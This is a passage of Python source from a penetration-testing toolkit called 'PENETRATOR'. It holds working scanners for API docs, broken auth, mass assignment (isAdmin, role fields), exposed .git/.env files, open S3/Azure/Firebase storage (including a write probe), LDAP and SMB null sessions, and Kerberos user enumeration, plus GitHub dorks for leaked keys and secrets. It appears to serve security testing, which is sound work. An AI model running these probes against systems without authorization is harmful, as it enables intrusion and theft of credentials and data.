    mac_to_ips: dict[str, list[str]] = {}

    for line in lines:
        parts = line.split()
        if len(parts) >= 3:
            # Windows format: IP   MAC   type
            ip_candidate = parts[0].strip("()")
            mac_candidate = ""
            for p in parts[1:]:
                if re.match(r"([0-9a-f]{2}[:-]){2,5}[0-9a-f]{2}", p, re.I):
                    mac_candidate = p.lower().replace("-", ":")
                    break
            if mac_candidate and re.match(r"\d+\.\d+\.\d+\.\d+", ip_candidate):
                ip_to_mac[ip_candidate] = mac_candidate
                mac_to_ips.setdefault(mac_candidate, []).append(ip_candidate)

    log(f"  Found {len(ip_to_mac)} ARP entries", "info")

    # Check for one MAC serving multiple IPs (potential spoofing)
    for mac, ips in mac_to_ips.items():
        if len(ips) > 1 and mac != "ff:ff:ff:ff:ff:ff":
            log(f"[!] MAC {mac} → {', '.join(ips)} (potential ARP spoof!)", "err")
            conflicts.append({"mac": mac, "ips": ips})

    if not conflicts:
        log("[+] No ARP conflicts detected", "ok")
    else:
        log(f"[!] {len(conflicts)} potential ARP spoofing conflict(s)", "warn")
    return conflicts


# ---------------------------------------------------------------------------
# 11. Swagger / OpenAPI Discovery
# ---------------------------------------------------------------------------
SWAGGER_PATHS = [
    "swagger.json", "swagger/v1/swagger.json", "swagger/v2/swagger.json",
    "api-docs", "api-docs.json", "v2/api-docs", "v3/api-docs",
    "openapi.json", "openapi.yaml", "openapi/v3/api-docs",
    "api/swagger.json", "api/openapi.json", "api/docs",
    "docs", "docs/api", "redoc", "graphql/schema",
    "_api/swagger.json", "api/v1/docs", "api/v2/docs",
    "swagger-ui.html", "swagger-resources",
    "actuator", "actuator/env", "actuator/health",
    ".well-known/openapi.yaml",
]


def swagger_discovery(url: str, log: Logger) -> list[dict]:
    """Brute-force common API documentation paths."""
    import requests
    from urllib.parse import urljoin

    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    url = url.rstrip("/") + "/"
    log(f"[*] Swagger/OpenAPI discovery on {url} ({len(SWAGGER_PATHS)} paths)", "cyan")
    found: list[dict] = []
    sess = requests.Session()
    sess.headers.update({"User-Agent": "PENETRATOR/1.0"})

    for path in SWAGGER_PATHS:
        if _should_stop():
            break
        target = urljoin(url, path)
        try:
            resp = sess.get(target, timeout=8, allow_redirects=True)
        except requests.RequestException:
            continue
        if resp.status_code == 200:
            ct = resp.headers.get("Content-Type", "")
            body_preview = resp.text[:500]
            is_api_doc = any(k in body_preview.lower() for k in
                            ("swagger", "openapi", "paths", "info", "endpoints",
                             "actuator", "schemas"))
            if is_api_doc or "json" in ct or "yaml" in ct:
                log(f"[+] {target} [{resp.status_code}] — API doc detected!", "err")
                found.append({"url": target, "content_type": ct,
                              "preview": body_preview[:200]})
            else:
                log(f"  {target} [{resp.status_code}] — not API doc", "muted")

    log(f"[*] {len(found)} API documentation endpoint(s) found", "warn" if found else "ok")
    return found


# ---------------------------------------------------------------------------
# 12. Broken Auth Tester (IDOR / Missing Auth)
# ---------------------------------------------------------------------------
def broken_auth_test(url: str, valid_token: str, log: Logger) -> dict:
    """Test an endpoint for broken authentication:
    - No token
    - Invalid token
    - Different user's token (if provided)
    """
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    log(f"[*] Broken auth test on {url}", "cyan")
    results: dict = {"url": url, "tests": []}
    sess = requests.Session()
    sess.headers.update({"User-Agent": "PENETRATOR/1.0"})

    # Test 1: No auth
    try:
        resp = sess.get(url, timeout=10)
        no_auth = {"test": "no_token", "status": resp.status_code,
                   "length": len(resp.content)}
        if resp.status_code == 200:
            log(f"[!] No auth → HTTP 200 (possible broken auth!)", "err")
            no_auth["vulnerable"] = True
        else:
            log(f"  No auth → HTTP {resp.status_code}", "info")
            no_auth["vulnerable"] = False
        results["tests"].append(no_auth)
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err")

    # Test 2: Invalid token
    for header_name in ("Authorization", "X-API-Key", "Cookie"):
        if _should_stop():
            break
        try:
            resp = sess.get(url, timeout=10,
                            headers={header_name: "invalid_token_12345"})
            test = {"test": f"invalid_{header_name}", "status": resp.status_code,
                    "length": len(resp.content)}
            if resp.status_code == 200:
                log(f"[!] Invalid {header_name} → HTTP 200 (broken auth!)", "err")
                test["vulnerable"] = True
            else:
                log(f"  Invalid {header_name} → HTTP {resp.status_code}", "info")
                test["vulnerable"] = False
            results["tests"].append(test)
        except requests.RequestException:
            pass

    # Test 3: With valid token (baseline)
    if valid_token:
        try:
            resp = sess.get(url, timeout=10,
                            headers={"Authorization": f"Bearer {valid_token}"})
            log(f"  Valid token → HTTP {resp.status_code} ({len(resp.content)} bytes)", "info")
            results["baseline"] = {"status": resp.status_code,
                                   "length": len(resp.content)}
        except requests.RequestException:
            pass

    vuln_count = sum(1 for t in results["tests"] if t.get("vulnerable"))
    log(f"[*] {vuln_count} broken auth indicator(s)", "warn" if vuln_count else "ok")
    return results


# ---------------------------------------------------------------------------
# 13. Mass Assignment Scanner
# ---------------------------------------------------------------------------
MASS_ASSIGN_FIELDS = [
    "role", "admin", "isAdmin", "is_admin", "is_superuser", "superuser",
    "verified", "is_verified", "email_verified", "active", "is_active",
    "permissions", "privilege", "level", "group", "groups", "scope",
    "type", "user_type", "account_type", "tier", "plan", "credit",
    "balance", "discount", "free_trial", "approved", "status",
]


def mass_assignment_test(url: str, method: str, base_body: str,
                         log: Logger) -> list[dict]:
    """Send extra fields (role=admin etc.) and check if they're accepted."""
    import requests
    import json

    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    method = (method or "POST").upper()
    log(f"[*] Mass assignment test on {url} ({len(MASS_ASSIGN_FIELDS)} fields)", "cyan")
    findings: list[dict] = []

    # Parse base body as JSON if possible
    try:
        body_dict = json.loads(base_body) if base_body else {}
        is_json = True
    except (json.JSONDecodeError, TypeError):
        body_dict = {}
        is_json = False

    sess = requests.Session()
    sess.headers.update({"User-Agent": "PENETRATOR/1.0"})

    # Baseline request
    try:
        if is_json:
            sess.headers["Content-Type"] = "application/json"
            baseline = sess.request(method, url, json=body_dict, timeout=10)
        else:
            baseline = sess.request(method, url, data=base_body or "", timeout=10)
        baseline_status = baseline.status_code
        baseline_len = len(baseline.content)
    except requests.RequestException as exc:
        log(f"[-] Baseline failed: {exc}", "err")
        return []

    log(f"  Baseline: HTTP {baseline_status} ({baseline_len} bytes)", "info")

    for field in MASS_ASSIGN_FIELDS:
        if _should_stop():
            break
        test_body = dict(body_dict)
        test_body[field] = True  # or "admin"

        try:
            if is_json:
                resp = sess.request(method, url, json=test_body, timeout=10)
            else:
                resp = sess.request(method, url, data=test_body, timeout=10)
        except requests.RequestException:
            continue

        # If server accepts the extra field without error
        if resp.status_code in (200, 201, 204):
            # Check if response differs from baseline
            if abs(len(resp.content) - baseline_len) > 50 or \
               resp.status_code != baseline_status:
                log(f"[+] Field '{field}' accepted with different response!", "err")
                findings.append({"field": field, "status": resp.status_code,
                                 "diff_len": len(resp.content) - baseline_len})
            else:
                log(f"  '{field}' — accepted but same response", "muted")
        elif resp.status_code == 422:
            log(f"  '{field}' — validation error (field recognized?)", "warn")
            findings.append({"field": field, "status": 422, "note": "recognized"})

    log(f"[*] {len(findings)} potential mass-assignment field(s)", "warn" if findings else "ok")
    return findings


# ---------------------------------------------------------------------------
# 14. Rate Limit Tester
# ---------------------------------------------------------------------------
def rate_limit_test(url: str, count: int, log: Logger) -> dict:
    """Send N rapid requests and detect if rate limiting is applied."""
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    count = max(10, min(500, count))
    log(f"[*] Rate limit test: {count} requests to {url}", "cyan")

    sess = requests.Session()
    sess.headers.update({"User-Agent": "PENETRATOR/1.0"})

    statuses: list[int] = []
    blocked_at: int | None = None

    for i in range(count):
        if _should_stop():
            break
        try:
            resp = sess.get(url, timeout=10)
            statuses.append(resp.status_code)
            if resp.status_code == 429:
                if blocked_at is None:
                    blocked_at = i + 1
                    log(f"[+] Rate limited at request #{i+1} (HTTP 429)", "ok")
                    retry_after = resp.headers.get("Retry-After", "not specified")
                    log(f"  Retry-After: {retry_after}", "info")
            elif resp.status_code in (403, 503) and i > 5:
                if blocked_at is None:
                    blocked_at = i + 1
                    log(f"[+] Blocked at request #{i+1} (HTTP {resp.status_code})", "ok")
        except requests.RequestException:
            statuses.append(0)

    rate_limited = blocked_at is not None
    if not rate_limited:
        log(f"[!] No rate limiting detected after {len(statuses)} requests!", "warn")
    else:
        log(f"[+] Rate limiting kicks in at request #{blocked_at}", "ok")

    return {"total_sent": len(statuses), "rate_limited": rate_limited,
            "blocked_at": blocked_at,
            "status_distribution": {s: statuses.count(s) for s in set(statuses)}}


# ---------------------------------------------------------------------------
# 15. Cipher Suite Grader
# ---------------------------------------------------------------------------
def cipher_suite_grade(host: str, port: int, log: Logger) -> dict:
    """Analyze TLS cipher suites and assign a security grade."""
    import ssl
    import socket as _socket

    port = port or 443
    log(f"[*] TLS cipher suite analysis: {host}:{port}", "cyan")

    WEAK_CIPHERS = {"RC4", "DES", "3DES", "NULL", "EXPORT", "MD5", "anon"}
    GOOD_CIPHERS = {"AES256-GCM", "CHACHA20", "AES128-GCM"}

    results: dict = {"host": host, "port": port, "ciphers": [], "grade": "?"}

    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_ciphers("ALL:COMPLEMENTOFALL")
        sock = _socket.create_connection((host, port), timeout=10)
        ssock = ctx.wrap_socket(sock, server_hostname=host)
        negotiated = ssock.cipher()
        all_ciphers = ctx.get_ciphers()
        ssock.close()
    except Exception as exc:
        log(f"[-] {exc}", "err")
        return results

    log(f"  Negotiated: {negotiated[0]} ({negotiated[2]} bits)", "info")
    results["negotiated"] = {"name": negotiated[0], "protocol": negotiated[1],
                             "bits": negotiated[2]}

    weak_found = []
    strong_found = []
    for c in all_ciphers:
        name = c.get("name", "")
        if any(w in name.upper() for w in WEAK_CIPHERS):
            weak_found.append(name)
        elif any(g in name.upper() for g in GOOD_CIPHERS):
            strong_found.append(name)

    # Grading
    if not weak_found and strong_found:
        grade = "A"
    elif not weak_found:
        grade = "B"
    elif len(weak_found) <= 2:
        grade = "C"
    elif len(weak_found) <= 5:
        grade = "D"
    else:
        grade = "F"

    results["grade"] = grade
    results["weak"] = weak_found
    results["strong"] = strong_found

    if weak_found:
        log(f"[!] {len(weak_found)} weak cipher(s):", "warn")
        for c in weak_found[:10]:
            log(f"    {c}", "err")
    if strong_found:
        log(f"[+] {len(strong_found)} strong cipher(s) available", "ok")
    log(f"[*] Grade: {grade}", "cyan" if grade in ("A", "B") else "warn")
    return results


# ---------------------------------------------------------------------------
# 16. RSA Key Analyzer
# ---------------------------------------------------------------------------
def rsa_key_analyze(key_text: str, log: Logger) -> dict:
    """Analyze an RSA public key for weaknesses."""
    import math

    log("[*] RSA key analysis", "cyan")
    results: dict = {"issues": []}

    # Try to parse the key
    try:
        # Remove PEM headers
        lines = [l for l in key_text.splitlines()
                 if not l.startswith("-----")]
        b64_data = "".join(lines)
        der = base64.b64decode(b64_data)
    except Exception as exc:
        log(f"[-] Failed to decode key: {exc}", "err")
        return results

    # Extract modulus (simplified DER parsing for RSA)
    # Look for large integers
    n = None
    e = None
    try:
        # Attempt to use cryptography library
        from cryptography.hazmat.primitives.serialization import load_pem_public_key
        key_bytes = key_text.encode()
        pub_key = load_pem_public_key(key_bytes)
        numbers = pub_key.public_numbers()
        n = numbers.n
        e = numbers.e
    except ImportError:
        log("[!] 'cryptography' library not installed — limited analysis", "warn")
        # Try basic extraction from DER
        # Just check key size from the DER length
        key_bits = len(der) * 4  # rough estimate
        results["estimated_bits"] = key_bits
        if key_bits < 2048:
            results["issues"].append("Key appears shorter than 2048 bits")
            log("[!] Key appears shorter than 2048 bits", "err")
    except Exception as exc:
        log(f"[-] Key parsing error: {exc}", "err")
        return results

    if n is not None and e is not None:
        bit_length = n.bit_length()
        results["bit_length"] = bit_length
        results["exponent"] = e
        log(f"  Modulus: {bit_length} bits", "info")
        log(f"  Exponent: {e}", "info")

        # Check 1: Key size
        if bit_length < 2048:
            results["issues"].append(f"Weak key size: {bit_length} bits (minimum 2048)")
            log(f"[!] Weak key size: {bit_length} bits", "err")
        elif bit_length < 3072:
            log(f"[~] Key size OK for now ({bit_length}), 3072+ recommended", "warn")

        # Check 2: Small exponent
        if e == 1:
            results["issues"].append("Exponent is 1 (trivial)")
            log("[!] Exponent = 1 — trivially broken!", "err")
        elif e < 65537:
            results["issues"].append(f"Small exponent: {e}")
            log(f"[!] Small exponent ({e}) — may be vulnerable to attacks", "warn")

        # Check 3: Fermat factorization (for close primes)
        if bit_length <= 512:
            log("  Attempting Fermat factorization...", "info")
            a = math.isqrt(n) + 1
            for _ in range(100000):
                b2 = a * a - n
                b = math.isqrt(b2)
                if b * b == b2:
                    p = a + b
                    q = a - b
                    results["factored"] = True
                    results["issues"].append(f"FACTORED! p={p}, q={q}")
                    log(f"[!] KEY FACTORED: p={p}, q={q}", "err")
                    break
                a += 1
            else:
                log("  Fermat: not easily factorable", "ok")

    if not results["issues"]:
        log("[+] No obvious weaknesses found", "ok")
    else:
        log(f"[!] {len(results['issues'])} issue(s) found", "warn")
    return results


# ---------------------------------------------------------------------------
# 17. Certificate Transparency Monitor
# ---------------------------------------------------------------------------
def ct_monitor(domain: str, log: Logger) -> list[dict]:
    """Query Certificate Transparency logs for recent certificates."""
    import requests
    log(f"[*] CT log query for {domain}", "cyan")
    certs: list[dict] = []

    # Use crt.sh API
    try:
        resp = requests.get(
            f"https://crt.sh/?q=%.{domain}&output=json",
            timeout=20, headers={"User-Agent": "PENETRATOR/1.0"})
        if resp.status_code != 200:
            log(f"[-] crt.sh returned HTTP {resp.status_code}", "err")
            return []
        data = resp.json()
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err")
        return []
    except ValueError:
        log("[-] Invalid JSON from crt.sh", "err")
        return []

    # Show most recent certs
    seen_names: set[str] = set()
    for entry in sorted(data, key=lambda x: x.get("id", 0), reverse=True)[:50]:
        if _should_stop():
            break
        name = entry.get("name_value", "")
        issuer = entry.get("issuer_name", "")
        not_before = entry.get("not_before", "")
        if name in seen_names:
            continue
        seen_names.add(name)
        certs.append({"name": name, "issuer": issuer, "not_before": not_before})
        log(f"  {not_before}  {name}  (issuer: {issuer[:50]})", "info")

    log(f"[*] {len(certs)} unique certificate(s) found", "cyan")

    # Flag wildcards and suspicious patterns
    wildcards = [c for c in certs if "*" in c["name"]]
    if wildcards:
        log(f"[!] {len(wildcards)} wildcard cert(s) detected", "warn")

    return certs


# ---------------------------------------------------------------------------
# 18. S3 Bucket Enumerator
# ---------------------------------------------------------------------------
def s3_bucket_enum(domain: str, log: Logger) -> list[dict]:
    """Try common S3 bucket name variations derived from the domain."""
    import requests
    base = domain.replace(".", "-").replace("www-", "")
    parts = domain.split(".")
    company = parts[0] if parts[0] != "www" else (parts[1] if len(parts) > 1 else parts[0])

    bucket_names = [
        company, f"{company}-backup", f"{company}-bak", f"{company}-dev",
        f"{company}-staging", f"{company}-prod", f"{company}-assets",
        f"{company}-uploads", f"{company}-data", f"{company}-logs",
        f"{company}-static", f"{company}-media", f"{company}-files",
        f"{company}-public", f"{company}-private", f"{company}-internal",
        f"{company}-test", f"{company}-temp", f"{company}-archive",
        base, f"{base}-backup", f"{base}-dev", f"{base}-assets",
    ]

    log(f"[*] S3 bucket enumeration ({len(bucket_names)} variations)", "cyan")
    found: list[dict] = []
    sess = requests.Session()
    sess.headers.update({"User-Agent": "PENETRATOR/1.0"})

    for name in bucket_names:
        if _should_stop():
            break
        url = f"https://{name}.s3.amazonaws.com"
        try:
            resp = sess.get(url, timeout=8)
        except requests.RequestException:
            continue

        if resp.status_code == 200:
            log(f"[+] {url} — PUBLIC (listable!)", "err")
            found.append({"bucket": name, "url": url, "status": "public",
                          "preview": resp.text[:300]})
        elif resp.status_code == 403:
            log(f"[~] {url} — exists but access denied", "warn")
            found.append({"bucket": name, "url": url, "status": "exists_private"})
        elif resp.status_code == 301:
            log(f"[~] {url} — redirected (different region)", "info")
            found.append({"bucket": name, "url": url, "status": "redirect"})

    log(f"[*] {len(found)} bucket(s) found", "warn" if found else "ok")
    return found


# ---------------------------------------------------------------------------
# 19. Azure Blob Checker
# ---------------------------------------------------------------------------
def azure_blob_check(domain: str, log: Logger) -> list[dict]:
    """Check for publicly accessible Azure Blob Storage containers."""
    import requests
    company = domain.split(".")[0]
    if company == "www" and len(domain.split(".")) > 1:
        company = domain.split(".")[1]

    account_names = [company, f"{company}storage", f"{company}data",
                     f"{company}blob", f"{company}files", f"{company}backup"]
    containers = ["$web", "public", "uploads", "data", "backup", "assets",
                  "media", "files", "images", "documents", "logs"]

    log(f"[*] Azure Blob check ({len(account_names)}×{len(containers)} combinations)", "cyan")
    found: list[dict] = []
    sess = requests.Session()
    sess.headers.update({"User-Agent": "PENETRATOR/1.0"})

    for account in account_names:
        if _should_stop():
            break
        for container in containers:
            if _should_stop():
                break
            url = f"https://{account}.blob.core.windows.net/{container}?restype=container&comp=list"
            try:
                resp = sess.get(url, timeout=8)
            except requests.RequestException:
                continue
            if resp.status_code == 200 and "EnumerationResults" in resp.text:
                log(f"[+] {account}/{container} — PUBLIC (listable!)", "err")
                found.append({"account": account, "container": container,
                              "url": url, "status": "public"})
            elif resp.status_code == 404:
                pass  # doesn't exist
            elif resp.status_code == 409:
                log(f"[~] {account}/{container} — exists (access denied)", "info")

    log(f"[*] {len(found)} accessible container(s)", "warn" if found else "ok")
    return found


# ---------------------------------------------------------------------------
# 20. Git Exposure Checker
# ---------------------------------------------------------------------------
GIT_PATHS = [
    ".git/HEAD", ".git/config", ".git/index", ".git/COMMIT_EDITMSG",
    ".git/description", ".git/info/refs", ".git/packed-refs",
    ".git/logs/HEAD", ".git/refs/heads/main", ".git/refs/heads/master",
    ".gitignore", ".env", ".env.local", ".env.production",
]


def git_exposure_check(url: str, log: Logger) -> list[dict]:
    """Check if .git directory is exposed on a web server."""
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    url = url.rstrip("/") + "/"
    log(f"[*] Git exposure check on {url}", "cyan")
    found: list[dict] = []
    sess = requests.Session()
    sess.headers.update({"User-Agent": "PENETRATOR/1.0"})

    for path in GIT_PATHS:
        if _should_stop():
            break
        target = url + path
        try:
            resp = sess.get(target, timeout=8)
        except requests.RequestException:
            continue

        if resp.status_code == 200 and len(resp.content) > 0:
            content = resp.text[:500]
            # Validate it's actually git content
            is_git = False
            if path == ".git/HEAD" and "ref:" in content:
                is_git = True
            elif path == ".git/config" and "[core]" in content:
                is_git = True
            elif path == ".git/index" and resp.content[:4] == b"DIRC":
                is_git = True
            elif path.startswith(".env") and "=" in content:
                is_git = True
            elif "commit" in content or "tree" in content or "ref" in content:
                is_git = True

            if is_git:
                log(f"[+] {target} — EXPOSED!", "err")
                log(f"    Preview: {content[:100]}", "info")
                found.append({"path": path, "url": target,
                              "preview": content[:200]})

    if found:
        log(f"[!] {len(found)} sensitive file(s) exposed — source code leak!", "err")
    else:
        log("[+] No git exposure detected", "ok")
    return found


# ---------------------------------------------------------------------------
# 21. Firebase DB Scanner
# ---------------------------------------------------------------------------
def firebase_scan(target: str, log: Logger) -> dict:
    """Check if a Firebase Realtime Database has open read rules."""
    import requests
    # Normalize to Firebase URL
    if ".firebaseio.com" not in target:
        target = f"https://{target}.firebaseio.com"
    if not target.startswith("http"):
        target = "https://" + target
    target = target.rstrip("/")

    log(f"[*] Firebase open-rules check: {target}", "cyan")
    results: dict = {"url": target, "readable": False, "writable": False}

    # Test read
    try:
        resp = requests.get(f"{target}/.json", timeout=10,
                            headers={"User-Agent": "PENETRATOR/1.0"})
        if resp.status_code == 200:
            data = resp.json() if resp.text.strip() else None
            if data is not None:
                log(f"[!] Database is READABLE! ({len(resp.text)} bytes)", "err")
                log(f"    Preview: {resp.text[:200]}", "info")
                results["readable"] = True
                results["data_size"] = len(resp.text)
            else:
                log("[+] Readable but empty", "warn")
                results["readable"] = True
        elif resp.status_code == 401:
            log("[+] Read access denied (rules configured)", "ok")
        else:
            log(f"  HTTP {resp.status_code}", "info")
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err")

    # Test write (with harmless probe)
    try:
        resp = requests.put(
            f"{target}/_penetrator_test/.json",
            json={"test": True}, timeout=10,
            headers={"User-Agent": "PENETRATOR/1.0"})
        if resp.status_code == 200:
            log("[!] Database is WRITABLE! (critical!)", "err")
            results["writable"] = True
            # Clean up
            requests.delete(f"{target}/_penetrator_test/.json", timeout=5)
        elif resp.status_code == 401:
            log("[+] Write access denied", "ok")
    except requests.RequestException:
        pass

    return results


# ---------------------------------------------------------------------------
# 22. LDAP Anonymous Bind
# ---------------------------------------------------------------------------
def ldap_anonymous_check(host: str, port: int, log: Logger) -> dict:
    """Test if LDAP server allows anonymous binding."""
    import socket as _socket

    port = port or 389
    log(f"[*] LDAP anonymous bind test: {host}:{port}", "cyan")
    results: dict = {"host": host, "port": port, "anonymous_bind": False, "entries": []}

    try:
        # Try using ldap3 if available
        import ldap3
        server = ldap3.Server(host, port=port, get_info=ldap3.DSA)
        conn = ldap3.Connection(server, auto_bind=True)
        log("[+] Anonymous bind SUCCESSFUL!", "err")
        results["anonymous_bind"] = True

        # Try to enumerate
        try:
            conn.search("", "(objectClass=*)", search_scope=ldap3.BASE,
                        attributes=["*"])
            if conn.entries:
                for entry in conn.entries[:10]:
                    log(f"  {entry.entry_dn}", "info")
                    results["entries"].append(str(entry.entry_dn))
        except Exception:
            pass

        # Try common base DNs
        for base in ["dc=local", "dc=corp", "dc=domain", "dc=company"]:
            try:
                conn.search(base, "(objectClass=person)",
                            search_scope=ldap3.SUBTREE,
                            attributes=["cn", "mail", "sAMAccountName"],
                            size_limit=20)
                if conn.entries:
                    log(f"[+] Found {len(conn.entries)} entries under {base}", "err")
                    for entry in conn.entries[:5]:
                        log(f"    {entry}", "info")
                        results["entries"].append(str(entry))
                    break
            except Exception:
                pass
        conn.unbind()
    except ImportError:
        # Fallback: raw socket
        log("[!] ldap3 not installed — basic TCP probe only", "warn")
        try:
            sock = _socket.create_connection((host, port), timeout=10)
            # Send minimal LDAP bind request (anonymous)
            bind_request = (
                b"\x30\x0c\x02\x01\x01\x60\x07\x02\x01\x03\x04\x00\x80\x00"
            )
            sock.sendall(bind_request)
            sock.settimeout(5)
            resp = sock.recv(1024)
            sock.close()
            if resp and b"\x61" in resp[:5]:
                # Check result code
                if b"\x0a\x01\x00" in resp:
                    log("[+] Anonymous bind appears successful!", "err")
                    results["anonymous_bind"] = True
                else:
                    log("[-] Bind rejected", "ok")
            else:
                log("[-] No valid LDAP response", "muted")
        except OSError as exc:
            log(f"[-] {exc}", "err")
    except Exception as exc:
        log(f"[-] {exc}", "err")

    return results


# ---------------------------------------------------------------------------
# 23. SMB Share Enumerator
# ---------------------------------------------------------------------------
def smb_enum(host: str, log: Logger) -> list[dict]:
    """Enumerate SMB shares via null session."""
    import subprocess
    log(f"[*] SMB share enumeration: {host}", "cyan")
    shares: list[dict] = []

    # Method 1: Try net view (Windows)
    try:
        result = subprocess.run(
            ["net", "view", f"\\\\{host}", "/all"],
            capture_output=True, text=True, timeout=15)
        if result.returncode == 0:
            for line in result.stdout.splitlines():
                line = line.strip()
                if line and not line.startswith("-") and "Share name" not in line:
                    parts = line.split()
                    if parts:
                        share_name = parts[0]
                        share_type = parts[1] if len(parts) > 1 else "?"
                        log(f"[+] \\\\{host}\\{share_name} ({share_type})", "ok")
                        shares.append({"name": share_name, "type": share_type})
        else:
            log(f"  net view failed: {result.stderr.strip()[:100]}", "muted")
    except (OSError, subprocess.TimeoutExpired) as exc:
        log(f"  net view: {exc}", "muted")

    # Method 2: Try smbclient if available
    try:
        import shutil
        if shutil.which("smbclient"):
            result = subprocess.run(
                ["smbclient", "-N", "-L", f"//{host}"],
                capture_output=True, text=True, timeout=15)
            for line in result.stdout.splitlines():
                if "Disk" in line or "IPC" in line or "Printer" in line:
                    parts = line.strip().split()
                    if parts:
                        name = parts[0]
                        if name not in [s["name"] for s in shares]:
                            shares.append({"name": name, "type": "smb"})
                            log(f"[+] //{host}/{name}", "ok")
    except (OSError, subprocess.TimeoutExpired):
        pass

    # Method 3: Direct SMB null session (port 445)
    if not shares:
        import socket as _socket
        try:
            sock = _socket.create_connection((host, 445), timeout=5)
            sock.close()
            log(f"  Port 445 open — SMB service available", "info")
            log("  Install 'smbclient' or 'impacket' for full enumeration", "warn")
        except OSError:
            try:
                sock = _socket.create_connection((host, 139), timeout=5)
                sock.close()
                log(f"  Port 139 open — NetBIOS/SMB available", "info")
            except OSError:
                log("[-] SMB ports (445/139) not reachable", "muted")

    log(f"[*] {len(shares)} share(s) found", "warn" if shares else "ok")
    return shares


# ---------------------------------------------------------------------------
# 24. Kerberos User Enumeration
# ---------------------------------------------------------------------------
def kerberos_enum(host: str, domain: str, userlist: list[str],
                  log: Logger) -> list[dict]:
    """Enumerate valid Kerberos users via AS-REQ responses."""
    import socket as _socket
    import struct as _struct

    log(f"[*] Kerberos user enumeration: {host} (domain: {domain})", "cyan")
    valid_users: list[dict] = []

    # Try using impacket if available
    try:
        from impacket.krb5.kerberosv5 import getKerberosTGT
        from impacket.krb5 import constants
        from impacket.krb5.types import Principal
        HAS_IMPACKET = True
    except ImportError:
        HAS_IMPACKET = False

    if HAS_IMPACKET:
        for username in userlist:
            if _should_stop():
                break
            try:
                principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                try:
                    getKerberosTGT(principal, "", domain,
                                   None, None, None, host)
                    log(f"[+] {username}@{domain} — VALID (got TGT!)", "err")
                    valid_users.append({"user": username, "status": "valid_tgt"})
                except Exception as e:
                    err_str = str(e)
                    if "KDC_ERR_PREAUTH_REQUIRED" in err_str:
                        log(f"[+] {username}@{domain} — VALID (preauth required)", "ok")
                        valid_users.append({"user": username, "status": "valid_preauth"})
                    elif "KDC_ERR_C_PRINCIPAL_UNKNOWN" in err_str:
                        log(f"  {username} — not found", "muted")
                    else:
                        log(f"  {username} — {err_str[:60]}", "muted")
            except Exception:
                pass
    else:
        log("[!] impacket not installed — basic port check only", "warn")
        try:
            sock = _socket.create_connection((host, 88), timeout=5)
            sock.close()
            log(f"[+] Kerberos port 88 is open on {host}", "info")
            log("  Install 'impacket' for user enumeration: pip install impacket", "warn")
        except OSError as exc:
            log(f"[-] Cannot reach Kerberos (port 88): {exc}", "err")

    log(f"[*] {len(valid_users)} valid user(s) found", "warn" if valid_users else "ok")
    return valid_users


# ---------------------------------------------------------------------------
# 25. GitHub Dorking
# ---------------------------------------------------------------------------
GITHUB_DORKS = [
    '"{domain}" password',
    '"{domain}" secret',
    '"{domain}" api_key',
    '"{domain}" apikey',
    '"{domain}" token',
    '"{domain}" AWS_SECRET_ACCESS_KEY',
    '"{domain}" private_key',
    '"{domain}" BEGIN RSA PRIVATE KEY',
    '"{domain}" jdbc:',
    '"{domain}" smtp',
]


def github_dorking(domain: str, log: Logger) -> list[dict]:
    """Search GitHub for leaked secrets related to a domain."""
    import requests
    log(f"[*] GitHub dorking for: {domain}", "cyan")
    findings: list[dict] = []

    sess = requests.Session()
    sess.headers.update({"User-Agent": "PENETRATOR/1.0",
                         "Accept": "application/vnd.github.v3+json"})

    for dork_template in GITHUB_DORKS:
        if _should_stop():
            break
        query = dork_template.format(domain=domain)
        try:
            resp = sess.get(
                "https://api.github.com/search/code",
                params={"q": query, "per_page": 5},
                timeout=15)
        except requests.RequestException as exc:
            log(f"  [-] {exc}", "muted")
            continue

        if resp.status_code == 403:
            log("[!] GitHub rate limit reached — try again later or use a token", "warn")
            break
        if resp.status_code != 200:
            continue

        data = resp.json()
        total = data.get("total_count", 0)
        if total > 0:
            log(f"[+] '{query[:50]}' → {total} result(s)", "err")
            for item in data.get("items", [])[:3]:
                repo = item.get("repository", {}).get("full_name", "")
                path = item.get("path", "")
                findings.append({"query": query, "repo": repo, "path": path,
                                 "url": item.get("html_url", "")})
                log(f"    {repo}/{path}", "info")
        time.sleep(2)  # Respect rate limits

    log(f"[*] {len(findings)} potential leak(s) found", "warn" if findings else "ok")
    return findings


# ---------------------------------------------------------------------------
# 26. Paste Site Monitor
# ---------------------------------------------------------------------------
def paste_monitor(domain: str, log: Logger) -> list[dict]:
    """Check paste sites for leaked data related to a domain."""
    import requests
    log(f"[*] Paste site monitoring for: {domain}", "cyan")
    findings: list[dict] = []
    sess = requests.Session()
    sess.headers.update({"User-Agent": "PENETRATOR/1.0"})

    # Search via Google dorking (paste sites)
    paste_dorks = [
        f"site:pastebin.com \"{domain}\"",
        f"site:paste.ee \"{domain}\"",
        f"site:ghostbin.com \"{domain}\"",
        f"site:hastebin.com \"{domain}\"",
        f"site:dpaste.org \"{domain}\"",
    ]

    # Check Pastebin scraping API (if available)
    try:
        resp = sess.get(
            f"https://psbdmp.ws/api/v3/search/{domain}",
            timeout=15)
        if resp.status_code == 200:
            try:
                data = resp.json()
                if isinstance(data, list) and data:
                    log(f"[+] Found {len(data)} paste(s) mentioning {domain}", "err")
                    for paste in data[:10]:
                        paste_id = paste.get("id", "")
                        paste_time = paste.get("time", "")
                        findings.append({"source": "psbdmp", "id": paste_id,
                                         "time": paste_time,
                                         "url": f"https://pastebin.com/{paste_id}"})
                        log(f"    {paste_time} — pastebin.com/{paste_id}", "info")
            except ValueError:
                pass
    except requests.RequestException:
        log("  psbdmp.ws not reachable", "muted")

    # Additional: IntelX (if no key, just report the search URL)
    intelx_url = f"https://intelx.io/?s={domain}"
    log(f"  Manual search: {intelx_url}", "info")

    log(f"[*] {len(findings)} paste(s) found", "warn" if findings else "ok")
    return findings


# ---------------------------------------------------------------------------
# 27. Domain Reputation Check
